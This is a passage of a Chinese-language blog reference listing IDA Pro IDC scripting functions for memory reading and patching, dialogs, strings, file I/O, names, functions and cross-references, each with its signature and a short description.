addr)</span></span></span><br></pre></td></tr></table></figure><p>从虚拟地址<strong>addr</strong>处读取一个字（2字节）值</p><h3 id="03-Dword"><a href="#03-Dword" class="headerlink" title="03 Dword"></a>03 Dword</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Dword</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>从虚拟地址<strong>addr</strong>处读取一个双字（4字节）值</p><h3 id="04-PatByte"><a href="#04-PatByte" class="headerlink" title="04 PatByte"></a>04 PatByte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PatchByte</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> val)</span></span></span><br></pre></td></tr></table></figure><p>设置虚拟地址<strong>addr</strong>处的一个字节值</p><h3 id="05-PatchWord"><a href="#05-PatchWord" class="headerlink" title="05 PatchWord"></a>05 PatchWord</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PatchWord</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> val)</span></span></span><br></pre></td></tr></table></figure><p>设置虚拟地址<strong>addr</strong>处的一个字值</p><h3 id="06-PatchDword"><a href="#06-PatchDword" class="headerlink" title="06 PatchDword"></a>06 PatchDword</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PatchDword</span><span class="params">(<span class="keyword">long</span> addr,<span class="keyword">long</span> val)</span></span></span><br></pre></td></tr></table></figure><p>设置虚拟地址addr处的一个双字值</p><h3 id="07-isLoaded"><a href="#07-isLoaded" class="headerlink" title="07 isLoaded"></a>07 isLoaded</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLoaded</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>如果addr包含有效数据，则返回1，否则返回0</p><h2 id="0x02-用户交互函数"><a href="#0x02-用户交互函数" class="headerlink" title="0x02 用户交互函数"></a>0x02 用户交互函数</h2><h3 id="01-Message"><a href="#01-Message" class="headerlink" title="01 Message"></a>01 Message</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Message</span><span class="params">(<span class="built_in">string</span> format,...)</span></span></span><br></pre></td></tr></table></figure><p>在输出窗口打印一条格式化消息。这个函数类似于C语言的<strong>printf</strong>函数，并接受<strong>printf</strong>风格的格式化字符串</p><h3 id="02-print"><a href="#02-print" class="headerlink" title="02 print"></a>02 print</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure><p>在输出窗口中打印每个参数的字符串表示形式</p><h3 id="03-Warning"><a href="#03-Warning" class="headerlink" title="03 Warning"></a>03 Warning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Warning</span><span class="params">(<span class="built_in">string</span> format,...)</span></span></span><br></pre></td></tr></table></figure><p>在对话框中显示一条格式化消息</p><h3 id="04-AskStr"><a href="#04-AskStr" class="headerlink" title="04 AskStr"></a>04 AskStr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">AskFile</span><span class="params">(<span class="built_in">string</span> <span class="keyword">default</span>, <span class="built_in">string</span> promat)</span></span></span><br></pre></td></tr></table></figure><p>显示一个输入框，要求用户输入一个字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0</p><h3 id="05-AskFile"><a href="#05-AskFile" class="headerlink" title="05 AskFile"></a>05 AskFile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">AskFile</span><span class="params">(<span class="keyword">long</span> doSave, <span class="built_in">string</span> mask, <span class="built_in">string</span> promat)</span></span></span><br></pre></td></tr></table></figure><p>显示一个文件选择对话框，以简化选择文件的任务。你可以创建新文件保存数据(<strong>doSave</strong>=1)，或选择现有的文件读取数据(<strong>doSave</strong>=0)。你可以根据<strong>mask</strong>(如*.<em>或\</em>.idc)过滤显示的文件列表。如果操作成功，则返回选定文件的名称；如果对话框被取消，则返回0</p><h3 id="06-AskYN"><a href="#06-AskYN" class="headerlink" title="06 AskYN"></a>06 AskYN</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">AskYN</span><span class="params">(<span class="keyword">long</span> <span class="keyword">default</span>, <span class="built_in">string</span> prompt)</span></span></span><br></pre></td></tr></table></figure><p>用一个答案为“是”或“否”的问题提示用户，突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个表示选定答案的整数</p><h3 id="07-ScreenEA"><a href="#07-ScreenEA" class="headerlink" title="07 ScreenEA"></a>07 ScreenEA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ScreenEA</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>返回当前光标所在位置的虚拟地址</p><h3 id="08-Jump"><a href="#08-Jump" class="headerlink" title="08 Jump"></a>08 Jump</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Jump</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>跳转到反汇编窗口的指定地址</p><h2 id="0x03-字符串操纵函数"><a href="#0x03-字符串操纵函数" class="headerlink" title="0x03 字符串操纵函数"></a>0x03 字符串操纵函数</h2><h3 id="01-form"><a href="#01-form" class="headerlink" title="01 form"></a>01 form</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">form</span><span class="params">(<span class="built_in">string</span> format,...)</span></span></span><br></pre></td></tr></table></figure><p>返回一个新字符串，该字符串根据所提供的格式化字符串和值进行格式化。这个函数基本上等同于C语言的<strong>sprintf</strong>函数</p><h3 id="02-sprintf"><a href="#02-sprintf" class="headerlink" title="02 sprintf"></a>02 sprintf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">sprintf</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>在IDA5.6中，<strong>sprintf</strong>用于替代<strong>form</strong></p><h3 id="03-atol"><a href="#03-atol" class="headerlink" title="03 atol"></a>03 atol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">atol</span><span class="params">(<span class="built_in">string</span> val)</span></span></span><br></pre></td></tr></table></figure><p>将十进制值val转换成对应的整数值</p><h3 id="04-xtol"><a href="#04-xtol" class="headerlink" title="04 xtol"></a>04 xtol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">xtol</span><span class="params">(<span class="built_in">string</span> val)</span></span></span><br></pre></td></tr></table></figure><p>将十六进制值<strong>val</strong>（可选择以0x开头）转换成对应的整数值</p><h3 id="05-ltoa"><a href="#05-ltoa" class="headerlink" title="05 ltoa"></a>05 ltoa</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">IItoa</span><span class="params">(<span class="keyword">long</span> val, <span class="keyword">long</span> radix)</span></span></span><br></pre></td></tr></table></figure><p>一指定的<strong>radix</strong>（2、8、10或16）返回<strong>val</strong>的字符串值</p><h3 id="06-ord"><a href="#06-ord" class="headerlink" title="06 ord"></a>06 ord</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ord</span><span class="params">(<span class="built_in">string</span> ch)</span></span></span><br></pre></td></tr></table></figure><p>返回单字符字符串<strong>ch</strong>的<strong>ASCII</strong>值</p><h3 id="07-strlen"><a href="#07-strlen" class="headerlink" title="07 strlen"></a>07 strlen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">strlen</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br></pre></td></tr></table></figure><p>返回所提供字符串的长度</p><h3 id="08-strstr"><a href="#08-strstr" class="headerlink" title="08 strstr"></a>08 strstr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">strstr</span><span class="params">(<span class="built_in">string</span> str, <span class="built_in">string</span> substr)</span></span></span><br></pre></td></tr></table></figure><p>返回<strong>str</strong>中<strong>substr</strong>的索引。如果没有发现子字符串，则返回-1</p><h3 id="09-substr"><a href="#09-substr" class="headerlink" title="09 substr"></a>09 substr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">substr</span><span class="params">(<span class="built_in">string</span> str, <span class="keyword">long</span> start, <span class="keyword">long</span> end)</span></span></span><br></pre></td></tr></table></figure><p>返回包含<strong>str</strong>中由<strong>start</strong>到<strong>end-1</strong>位置的字符的子字符串。如果使用分片，此函数等同于<strong>str[start:end]</strong></p><h2 id="0x04-文件输入-输出函数"><a href="#0x04-文件输入-输出函数" class="headerlink" title="0x04 文件输入/输出函数"></a>0x04 文件输入/输出函数</h2><h3 id="01-fopen"><a href="#01-fopen" class="headerlink" title="01 fopen"></a>01 fopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fopen</span><span class="params">(<span class="built_in">string</span> filename, <span class="built_in">string</span> mode)</span></span></span><br></pre></td></tr></table></figure><p>返回一个整数文件句柄（如果发生错误，则返回0），供所有<strong>IDC</strong>文件输入/输出函数使用。<strong>mode</strong>参数与C语言的fopen函数使用的模式（r表示读取，w表示写入，等等）类似</p><h3 id="02-fclose"><a href="#02-fclose" class="headerlink" title="02 fclose"></a>02 fclose</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fclose</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure><p>关闭fopen中文件句柄指定的文件</p><h3 id="03-filelength"><a href="#03-filelength" class="headerlink" title="03 filelength"></a>03 filelength</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">filelength</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure><p>返回指定文件的长度，如果发生错误，则返回-1</p><h3 id="04-fgetc"><a href="#04-fgetc" class="headerlink" title="04 fgetc"></a>04 fgetc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fgetc</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure><p>从给定的文件中读取一个字节，如果发生错误，则返回-1</p><h3 id="05-fputc"><a href="#05-fputc" class="headerlink" title="05 fputc"></a>05 fputc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fputc</span><span class="params">(<span class="keyword">long</span> val, <span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure><p>写入一个字节到给定文件中。如果操作成功，则返回0；如果发生错误，则返回-1</p><h3 id="06-fprintf"><a href="#06-fprintf" class="headerlink" title="06 fprintf"></a>06 fprintf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fprintf</span><span class="params">(<span class="keyword">long</span> handle, <span class="built_in">string</span> format, ...)</span></span></span><br></pre></td></tr></table></figure><p>将一个格式化字符串写入到给定文件中</p><h3 id="07-writestr"><a href="#07-writestr" class="headerlink" title="07 writestr"></a>07 writestr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">writestr</span><span class="params">(<span class="keyword">long</span> handle, <span class="built_in">string</span> str)</span></span></span><br></pre></td></tr></table></figure><p>将指定的字符串写入到给定的文件中</p><h3 id="08-readstr"><a href="#08-readstr" class="headerlink" title="08 readstr"></a>08 readstr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>/<span class="function"><span class="keyword">long</span> <span class="title">readstr</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure><p>从给定文件中读取一个字符串。这个函数读取到下一个换行符为止的字符串（包括非<strong>ASCII</strong>字符），包括换行符本身（<strong>ASCII 0xA</strong>）。如果操作成功，则返回字符串；如果读取到文件结尾，则返回<strong>-1</strong></p><h3 id="09-writelong"><a href="#09-writelong" class="headerlink" title="09 writelong"></a>09 writelong</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">writelong</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> val, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure><p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序将一个4字节整数写入到给定文件</p><h3 id="10-readlong"><a href="#10-readlong" class="headerlink" title="10 readlong"></a>10 readlong</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">readlong</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure><p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序从给定的文件中读取一个4字节整数</p><h3 id="11-writeshort"><a href="#11-writeshort" class="headerlink" title="11 writeshort"></a>11 writeshort</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">writeshort</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> val, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure><p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序将一个2字节整数写入到给定文件</p><h3 id="12-readshort"><a href="#12-readshort" class="headerlink" title="12 readshort"></a>12 readshort</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">readshort</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure><p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序从给定的文件中读取一个2字节整数</p><h3 id="13-loadfile"><a href="#13-loadfile" class="headerlink" title="13 loadfile"></a>13 loadfile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">loadfile</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> pos, <span class="keyword">long</span> addr, <span class="keyword">long</span> length)</span></span></span><br></pre></td></tr></table></figure><p>从给定文件的<strong>pos</strong>位置读取<strong>length</strong>数量的字节，并将这些字节写入到以<strong>addr</strong>地址开头的数据库中</p><h3 id="14-savefile"><a href="#14-savefile" class="headerlink" title="14 savefile"></a>14 savefile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">savefile</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> pos, <span class="keyword">long</span> addr, <span class="keyword">long</span> length)</span></span></span><br></pre></td></tr></table></figure><p>将以addr数据库地址开头的length数量的字节写入给定文件的<strong>pos</strong>位置</p><h2 id="0x05-操纵数据库名称"><a href="#0x05-操纵数据库名称" class="headerlink" title="0x05 操纵数据库名称"></a>0x05 操纵数据库名称</h2><h3 id="01-Name"><a href="#01-Name" class="headerlink" title="01 Name"></a>01 Name</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Name</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不返沪用户定义的名称</p><h3 id="02-NameEx"><a href="#02-NameEx" class="headerlink" title="02 NameEx"></a>02 NameEx</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">NameEx</span><span class="params">(<span class="keyword">long</span> from, <span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果<strong>from</strong>是一个同样包含<strong>addr</strong>的函数中的地址，则这个函数返回用户定义的局部名称</p><h3 id="03-MakeNameEx"><a href="#03-MakeNameEx" class="headerlink" title="03 MakeNameEx"></a>03 MakeNameEx</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeNameEx</span><span class="params">(<span class="keyword">long</span> addr, <span class="built_in">string</span> name, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure><p>将给定的名称分配给定的地址。该名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的<strong>MakeNameEx</strong>文档中有记载描述，可用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出</p><h3 id="04-long-LocByName"><a href="#04-long-LocByName" class="headerlink" title="04 long LocByName"></a>04 long LocByName</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">LocByName</span><span class="params">(<span class="built_in">string</span> name)</span></span></span><br></pre></td></tr></table></figure><p>返回一个位置（名称已给定）的地址。如果数据库中没有这个名称，则返回<strong>BADADDR(-1)</strong></p><h3 id="05-long-LocByNameEX"><a href="#05-long-LocByNameEX" class="headerlink" title="05 long LocByNameEX"></a>05 long LocByNameEX</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">LocByName</span><span class="params">(<span class="keyword">long</span> funcaddr, <span class="built_in">string</span> localname)</span></span></span><br></pre></td></tr></table></figure><p>在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回<strong>BADADDR(-1)</strong></p><h2 id="0x06-处理函数的函数"><a href="#0x06-处理函数的函数" class="headerlink" title="0x06 处理函数的函数"></a>0x06 处理函数的函数</h2><h3 id="01-GetFunctionAttr"><a href="#01-GetFunctionAttr" class="headerlink" title="01 GetFunctionAttr"></a>01 GetFunctionAttr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">GetFunctionAttr</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> attrib)</span></span></span><br></pre></td></tr></table></figure><p>返回包含给定地址的函数的被请求的属性。请参考IDC帮助文档了解属性常量。例如，要查找一个函数的结束地址，可以使用<code>GetFunctionAttr(addr, FUNCATTR_END)</code></p><h3 id="02-GetFunctionName"><a href="#02-GetFunctionName" class="headerlink" title="02 GetFunctionName"></a>02 GetFunctionName</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetFunctionName</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回包含给定地址的函数的名称。如果给定的地址并不属于一个函数，则返回一个空字符串</p><h3 id="03-NextFunction"><a href="#03-NextFunction" class="headerlink" title="03 NextFunction"></a>03 NextFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">NextFunction</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</p><h3 id="04-PrevFunction"><a href="#04-PrevFunction" class="headerlink" title="04 PrevFunction"></a>04 PrevFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">PrevFunction</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址之前距离最近的函数起始地址。如果在给定地址之前没有函数，则返回-1</p><h3 id="05-long-LocBy"><a href="#05-long-LocBy" class="headerlink" title="05 long LocBy"></a>05 long LocBy</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">LocBy</span><span class="params">(<span class="built_in">string</span> Name)</span></span></span><br></pre></td></tr></table></figure><p>根据函数的名称，返回该函数的起始地址</p><h2 id="0x07-代码交叉引用函数"><a href="#0x07-代码交叉引用函数" class="headerlink" title="0x07 代码交叉引用函数"></a>0x07 代码交叉引用函数</h2><h3 id="01-Rfirst"><a href="#01-Rfirst" class="headerlink" title="01 Rfirst"></a>01 Rfirst</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Rfirst</span><span class="params">(<span class="keyword">long</span> from)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址向其转交控制权的第一个位置。如果给定的地址没有引用其他地址，则返回<strong>BADADDR(-1)</strong></p><h3 id="02-Rnext"><a href="#02-Rnext" class="headerlink" title="02 Rnext"></a>02 Rnext</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Rnext</span><span class="params">(<span class="keyword">long</span> from, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure><p>如果<strong>current</strong>已经在前一次调用<strong>Rfirst</strong>或<strong>Rnext</strong>时返回，则返回给定地址（<strong>from</strong>）转交控制权的下一个位置。如果没有其他交叉引用存在，<strong>BADADDR(-1)</strong></p><h3 id="03-XrefType"><a href="#03-XrefType" class="headerlink" title="03 XrefType"></a>03 XrefType</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">XrefType</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>返回一个常量，说明某个交叉引用查询函数（如<strong>Rfirst</strong>）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括<strong>fl_CN</strong>(近调用)、<strong>fl_CF</strong>(远调用)、<strong>fl_JN</strong>(近跳转)、<strong>fl_JF</strong>(远跳转)和<strong>fl_F</strong>(普通顺序流)</p><h3 id="04-RfirstB"><a href="#04-RfirstB" class="headerlink" title="04 RfirstB"></a>04 RfirstB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">RfirstB</span><span class="params">(<span class="keyword">long</span> to)</span></span></span><br></pre></td></tr></table></figure><p>返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回<strong>BADADDR(-1)</strong></p><h3 id="05-RnextB"><a href="#05-RnextB" class="headerlink" title="05 RnextB"></a>05 RnextB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">RnextB</span><span class="params">(<span class="keyword">long</span> to, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure><p>如果<strong>current</strong>已经在前一次调用<strong>RfirstB</strong>或<strong>RnextB</strong>时返回，则返回下一个转交控制权到给定地址（<strong>to</strong>）的位置。如果不存在其他对给定位置的交叉引用，<strong>BADADDR(-1)</strong></p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><h3 id="01-Dfirst"><a href="#01-Dfirst" class="headerlink" title="01 Dfirst"></a>01 Dfirst</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Dfirst</span><span class="params">(<span class="keyword">long</span> from)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址引用一个数据值的第一个位置。如果给定的地址没有引用其他地址，则返回<strong>BADADDR(-1)</strong></p><h3 id="02-Dnext"><a href="#02-Dnext" class="headerlink" title="02 Dnext"></a>02 Dnext</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Dnext</span><span class="params">(<span class="keyword">long</span> from, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure><p>如果<strong>current</strong>已经在前一次调用<strong>Dfirst</strong>或<strong>Dnext</strong>时返回，则返回给定地址（<strong>from</strong>）向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，<strong>BADADDR(-1)</strong></p><h3 id="03-XrefType-1"><a href="#03-XrefType-1" class="headerlink" title="03 XrefType"></a>03 XrefType</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">XrefType</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>返回一个常量，说明某个交叉引用查询函数（如<strong>Dfirst</strong>）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括<strong>dr_0</strong>(提供的偏移量)、<strong>dr_W</strong>(数据写入)和<strong>dr_R</strong>(数据读取)</p><h3 id="04-DfirstB"><a href="#04-DfirstB" class="headerlink" title="04 DfirstB"></a>04 DfirstB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">DfirstB</span><span class="params">(<span class="keyword">long</span> to)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址作为数据引用的第一个位置。如果不存在对给定地址的交叉引用，则返回<strong>BADADDR(-1)</strong></p><h3 id="05-DnextB"><a href="#05-DnextB" class="headerlink" title="05 DnextB"></a>05 DnextB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">DnextB</span><span class="params">(<span class="keyword">long</span> to, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure><p>如果<strong>current</strong>已经在前一次调用<strong>DfirstB</strong>或<strong>DnextB</strong>时返回，则返回将给定地址（<strong>to</strong>）作为数据引用的下一次位置。如果没有其他交叉引用存在，<strong>BADADDR(-1)</strong></p><h2 id="0x09-数据库操纵函数"><a href="#0x09-数据库操纵函数" class="headerlink" title="0x09 数据库操纵函数"></a>0x09 数据库操纵函数</h2><h3 id="01-MakeUnkn"><a href="#01-MakeUnkn" class="headerlink" title="01 MakeUnkn"></a>01 MakeUnkn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MakeUnkn</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> 